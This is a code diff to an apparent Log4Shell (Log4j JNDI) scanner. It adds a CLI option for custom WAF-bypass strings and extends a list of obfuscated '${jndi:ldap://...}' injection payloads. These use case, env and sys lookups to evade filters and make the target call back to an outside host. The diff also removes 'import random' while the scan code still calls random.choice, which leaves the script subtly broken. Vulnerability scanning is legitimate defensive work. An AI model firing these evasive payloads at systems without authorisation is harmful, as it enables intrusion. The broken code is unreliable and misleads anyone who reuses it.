@@ -16,7 +16,6 @@ import sys
 from urllib import parse as urlparse
 import base64
 import json
-import random
 from uuid import uuid4
 from base64 import b64encode
 from Crypto.Cipher import AES, PKCS1_OAEP
@@ -57,7 +56,15 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}"]
+                       "${jndi:dns://{{callback_host}}}",
+                       "${jndi:ldap://{{callback_host}}/{{random}}}",
+                       "${jndi:ldap:/{{callback_host}}/{{random}}}",
+                       "${jndi:dns:/{{callback_host}}}",
+                       "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
+                       "${jnd${upper:ı}:ldap://{{callback_host}}/{{random}}}",
+                       "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
+                       "${${env:{{ENV_NAME}}:-j}ndi${env:{{ENV_NAME}}:-:}${env:{{ENV_NAME}}:-l}dap${env:{{ENV_NAME}}:-:}//{{callback_host}}/{{random}}}",
+                       "${jnd${sys:{{SYS_PROP}}:-i}:ldap:/{{callback_host}}/{{random}}}"]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -100,6 +107,10 @@ parser.add_argument("--waf-bypass",
                     dest="waf_bypass_payloads",
                     help="Extend scans with WAF bypass payloads.",
                     action='store_true')
+parser.add_argument("--custom-waf-bypass",
+                    required=False,
+                    dest="custom_waf_bypass",
+                    help="Input your custom WAF bypass string")
 parser.add_argument("--dns-callback-provider",
                     dest="dns_callback_provider",
                     help="DNS Callback provider (Options: dnslog.cn, interact.sh) - [Default: interact.sh].",
@@ -146,13 +157,19 @@ def get_fuzzing_post_data(payload):
 
 def generate_waf_bypass_payloads(callback_host, random_string):
     payloads = []
+    varr = input("Enter envar for envar based waf payload--> ")
+    varr2 = input("Enter SYS property var for SYS var based waf payload--> ")
     for i in waf_bypass_payloads:
         new_payload = i.replace("{{callback_host}}", callback_host)
         new_payload = new_payload.replace("{{random}}", random_string)
+        new_payload = new_payload.replace("{{ENV_NAME}}", varr)
+        new_payload = new_payload.replace("{{SYS_PROP}}", varr2)
         payloads.append(new_payload)
     return payloads
-
-
+def custom_waf_payloads(pay_load):
+    payloads = []
+    payloads.append(pay_load)
+    return payloads
 class Dnslog(object):
     def __init__(self):
         self.s = requests.session()
@@ -260,11 +277,13 @@ def parse_url(url):
 
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
+    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for _ in range(7))
     payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+    if args.custom_waf_bypass:
+        payloads.extend(custom_waf_payloads(args.custom_waf_bypass))
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
         if args.request_type.upper() == "GET" or args.run_all_tests:
